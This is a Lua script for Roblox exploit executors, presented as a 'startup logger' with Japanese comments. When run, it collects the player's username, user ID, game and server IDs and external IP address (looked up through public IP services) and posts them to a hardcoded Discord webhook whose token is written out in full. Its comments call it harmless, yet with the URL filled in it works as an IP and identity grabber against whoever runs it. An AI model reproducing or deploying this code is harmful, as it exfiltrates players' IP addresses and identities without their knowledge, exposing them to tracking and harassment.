--[[
    Discord Startup Logger v2.0
    機能: 起動ログ（アバターアイコン + プレイヤー情報 + ゲーム情報 + IP）
    ・URL未設定なら完全無害
    ・Avatar thumbnail / ゲーム名 / 各種ID / IP をEmbedで送信
]]

-- ==========================================
-- 設定
-- ==========================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1551183993678991502/CS2wbN6nhsxWx6DaF0kYKLJKSJ_3otBABFO0kk-dmMpaktJv4-CJW7Hl60MpCofPvgQB"   -- ←ここにWebhook URLを貼る
local WEBHOOK_NAME = "ログ送信"              -- Webhookの表示名
local MESSAGE = "スクリプト起動ログ"      -- Embedの上に出す文章（""で非表示）
local EMBED_COLOR = 0x64FF96             -- Embed左のライン色
local FETCH_IP = true                    -- 外部IPを取得するか

-- URL未設定なら何もしない
if WEBHOOK_URL == "" or WEBHOOK_URL == "ウェブフックをここに入れる" then
    warn("[Logger] Webhook URL未設定のため終了")
    return
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

-- ==========================================
-- HTTP リクエスト関数の自動判定
-- ==========================================
local function getRequestFunc()
    return request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
end

-- ==========================================
-- アバターアイコンURL取得
-- ==========================================
local function getAvatarUrl(userId)
    -- まずプレイヤーのHeadshot（420x420）を取得
    local ok, url = pcall(function()
        return Players:GetUserThumbnailAsync(
            userId,
            Enum.ThumbnailType.HeadShot,
            Enum.ThumbnailSize.Size420x420
        )
    end)
    if ok and url then return url end

    -- フォールバック：thumbnails API経由
    local req = getRequestFunc()
    if req then
        local ok2, res = pcall(function()
            return req({
                Url = string.format("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false", userId),
                Method = "GET"
            })
        end)
        if ok2 and res and res.Body then
            local ok3, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
            if ok3 and decoded and decoded.data and decoded.data[1] then
                return decoded.data[1].imageUrl
            end
        end
    end
    return nil
end

-- ==========================================
-- IP取得（複数サービスをフォールバック）
-- ==========================================
local function getIP()
    if not FETCH_IP then return "取得無効" end
    local req = getRequestFunc()
    if not req then return "IP取得不可" end

    local services = {
        "https://api.ipify.org",
        "https://icanhazip.com",
        "https://ifconfig.me/ip"
    }
    for _, url in ipairs(services) do
        local ok, res = pcall(function()
            return req({ Url = url, Method = "GET" })
        end)
        if ok and res and res.Body then
            local ip = tostring(res.Body):gsub("%s+", "")
            if ip:match("^%d+%.%d+%.%d+%.%d+$") then
                return ip
            end
        end
    end
    return "取得失敗"
end

-- ==========================================
-- Webhook送信
-- ==========================================
local function sendToWebhook(payload)
    local req = getRequestFunc()
    if not req then
        warn("[Logger] HTTPリクエスト関数が見つかりません")
        return false
    end
    local body = HttpService:JSONEncode(payload)
    local ok, res = pcall(function()
        return req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body
        })
    end)
    if not ok then
        warn("[Logger] 送信失敗: " .. tostring(res))
    end
    return ok
end

-- ==========================================
-- 起動ログ組み立て & 送信
-- ==========================================
local function sendStartupLog()
    local userId = LP.UserId
    local displayName = LP.DisplayName
    local playerName = LP.Name
    local placeId = game.PlaceId
    local gameName = game.Name or "Unknown"
    local jobId = game.JobId ~= "" and game.JobId or "N/A"
    local time = os.date("%Y-%m-%d %H:%M:%S")
    local ip = getIP()
    local avatarUrl = getAvatarUrl(userId)

    -- フィールド組み立て
    local fields = {
        { name = "ユーザー名", value = displayName .. " (@" .. playerName .. ")", inline = true },
        { name = "ユーザーID", value = tostring(userId), inline = true },
        { name = "ゲーム名", value = gameName, inline = false },
        { name = "ゲームID", value = tostring(placeId), inline = true },
        { name = "Job ID", value = jobId, inline = false },
        { name = "IPアドレス", value = ip, inline = true },
        { name = "起動時刻", value = time, inline = true },
    }

    local embed = {
        title = "起動ログ",
        description = MESSAGE ~= "" and MESSAGE or nil,
        color = EMBED_COLOR,
        fields = fields,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
        footer = { text = "Startup Logger v2.0" }
    }

    -- アバターアイコン（右上の小さいサムネ）
    if avatarUrl then
        embed.thumbnail = { url = avatarUrl }
        -- 大きい画像としても出したい場合は image を使う（両方指定すると両方出る）
        -- embed.image = { url = avatarUrl }
    end

    local payload = {
        username = WEBHOOK_NAME,
        embeds = { embed }
    }

    sendToWebhook(payload)
    print("[Logger] 起動ログを送信しました")
end

-- ==========================================
-- 実行
-- ==========================================
task.spawn(function()
    pcall(sendStartupLog)
end)
